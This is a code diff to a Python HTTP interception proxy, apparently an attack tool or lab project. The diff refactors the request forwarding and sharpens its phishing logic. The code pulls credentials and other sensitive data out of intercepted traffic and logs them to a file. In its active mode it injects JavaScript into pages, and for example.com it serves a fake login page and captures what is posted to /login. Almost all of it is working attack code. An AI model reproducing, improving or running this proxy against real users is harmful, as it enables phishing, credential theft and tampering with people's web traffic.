@@ -29,7 +29,6 @@ def extract_sensitive_info(data):
             found_data[key] = unquoted_matches
     return found_data
 
-
 def log_passive_info(data):
     # Continuously log sensitive info to `info1.txt`
     sensitive_info = extract_sensitive_info(data)
@@ -74,11 +73,8 @@ def inject_javascript(response, proxy_ip):
         modified_response = re.sub(r"</body>", js_code + "</body>", response, flags=re.IGNORECASE)
         print("Injected JS code into response.")
     else:
-        # Append JS at the end if </body> tag is not found
-        # modified_response = response + js_code
         print("No </body> tag found; Couldn't Inject")
     return modified_response
-
 
 def handle_client(client_socket, mode, proxy_ip):
     # Receive client request
@@ -101,19 +97,13 @@ def handle_client(client_socket, mode, proxy_ip):
             else:
                 destination_host_split = destination_host.split(sep=':')
                 destination_ip = destination_host_split[0]
-                print(destination_host_split[1])
-                if destination_host_split[1] != "8080" or destination_host_split[1] != "80":
-                    destination_port = 80
-                else:
-                    destination_port = destination_host_split[1]
-                
-
+                destination_port = int(destination_host_split[1]) if destination_host_split[1].isdigit() else 80
         except socket.gaierror:
             client_socket.close()
             return
-        
-        # Phishing Attack for specific domain (e.g., example.com)
-        if destination_host == "example.com":
+
+        # Serve phishing page for `GET http://example.com/`
+        if request.startswith("GET") and destination_host == "example.com":
             phishing_page = """HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n
             <html>
             <head>
@@ -179,48 +169,54 @@ def handle_client(client_socket, mode, proxy_ip):
                 </div>
             </body>
             </html>
-
             """
-
-            log_passive_info(f"Phishing page served for {destination_host}. Request details: {request}")
             client_socket.send(phishing_page.encode('utf-8'))
             client_socket.close()
             return
-        
+
+        # Handle `POST` request to `/login` by responding with a `GET https://example.com/`
+        if request.startswith("POST") and destination_host == "example.com" and "/login" in request.split(" ")[1]:
+            log_passive_info(f"Phishing page served for {destination_host}. Request details: {request}")
+            get_request = "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n"
+            forward_request(client_socket, destination_ip, destination_port, get_request, mode, proxy_ip)
+            return
+
         if mode == "passive":
-            # Log request data (includes headers and URL query parameters)
             log_passive_info(request)
         elif mode == "active" and destination_ip == proxy_ip:
-            print("Detected request for proxy itself; logging active information.")
             log_active_info(request)
 
-        # Forward request to the actual destination
-        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            server_socket.connect((destination_ip, destination_port))
-            server_socket.send(request.encode('utf-8'))
-
-            # Receive and forward response in chunks to handle large responses
-            while True:
-                response = server_socket.recv(4096)
-                if len(response) == 0:
-                    break  # Exit loop when no more data is received
-
-                if mode == "active":
-                    response_decoded = response.decode('utf-8', errors='ignore')
-                    response_with_js = inject_javascript(response_decoded, proxy_ip)
-                    client_socket.send(response_with_js.encode('utf-8'))
-                else:
-                    # Send the response back to the client exactly as received
-                    client_socket.send(response)
-        except ConnectionRefusedError:
-            print(f"Connection to {destination_host} ({destination_ip}) refused.")
-        finally:
-            client_socket.close()
-            server_socket.close()
+        # Forward request to the actual destination for all other cases
+        forward_request(client_socket, destination_ip, destination_port, request, mode, proxy_ip)
     else:
-        print("nope")
+        print("Invalid or unsupported request.")
+        client_socket.close()
 
+def forward_request(client_socket, destination_ip, destination_port, request, mode, proxy_ip):
+    """Forward the request to the actual destination and return the response."""
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        server_socket.connect((destination_ip, destination_port))
+        server_socket.send(request.encode('utf-8'))
+
+        # Receive and forward response in chunks to handle large responses
+        while True:
+            response = server_socket.recv(4096)
+            if len(response) == 0:
+                break  # Exit loop when no more data is received
+
+            if mode == "active":
+                response_decoded = response.decode('utf-8', errors='ignore')
+                response_with_js = inject_javascript(response_decoded, proxy_ip)
+                client_socket.send(response_with_js.encode('utf-8'))
+            else:
+                # Send the response back to the client exactly as received
+                client_socket.send(response)
+    except ConnectionRefusedError:
+        print(f"Connection to refused.")
+    finally:
+        client_socket.close()
+        server_socket.close()
 
 def start_proxy(ip, port, mode):
     proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
